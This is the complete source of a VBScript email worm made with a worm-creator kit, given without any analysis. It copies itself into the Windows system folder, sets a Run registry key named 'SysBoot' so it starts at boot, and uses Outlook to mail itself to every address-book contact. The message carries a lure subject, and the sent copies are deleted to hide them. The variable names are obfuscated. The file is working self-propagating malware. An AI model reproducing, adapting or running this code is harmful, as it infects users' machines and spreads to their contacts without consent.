'Worm Created whit [K]Alamar's Vbs Worms Creator 0.1
On Error Resume Next
Set anyfmdlegtn = CreateObject("WScript.Shell")
set qojtokrwnnh=createobject("scripting.filesystemobject")
qojtokrwnnh.copyfile wscript.scriptfullname,qojtokrwnnh.GetSpecialFolder(0)& "\SillyWorm.vbs"
anyfmdlegtn.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SysBoot","wscript.exe "&qojtokrwnnh.GetSpecialFolder(0)& "\SillyWorm.vbs %"
if anyfmdlegtn.regread ("HKCU\software\SillyWorm\mailed") <> "1" then
mjsrcnzcagi()
end if
Function mjsrcnzcagi()
On Error Resume Next
Set pabfkiweoyh = CreateObject("Outlook.Application")
If pabfkiweoyh= "Outlook"Then
Set ezptutvokod=pabfkiweoyh.GetNameSpace("MAPI")
For Each kjrtvqdlhzq In ezptutvokod.AddressLists
If kjrtvqdlhzq.AddressEntries.Count <> 0 Then
For rbqszeovpiw= 1 To kjrtvqdlhzq.AddressEntries.Count
Set hgulunpqdif = kjrtvqdlhzq.AddressEntries(rbqszeovpiw)
Set pnyjwsqwemw = pabfkiweoyh.CreateItem(0)
pnyjwsqwemw.To = hgulunpqdif.Address
pnyjwsqwemw.Subject = "Here you have, ;o)"
pnyjwsqwemw.Body = "Test please do not open"
pnyjwsqwemw.Attachments.Add qojtokrwnnh.GetSpecialFolder(0)& "\SillyWorm.vbs"
pnyjwsqwemw.DeleteAfterSubmit = True
If pnyjwsqwemw.To <> "" Then
pnyjwsqwemw.Send
End If
Next
End If
Next
anyfmdlegtn.regwrite "HKCU\software\SillyWorm\mailed", "1"
end if
End Function

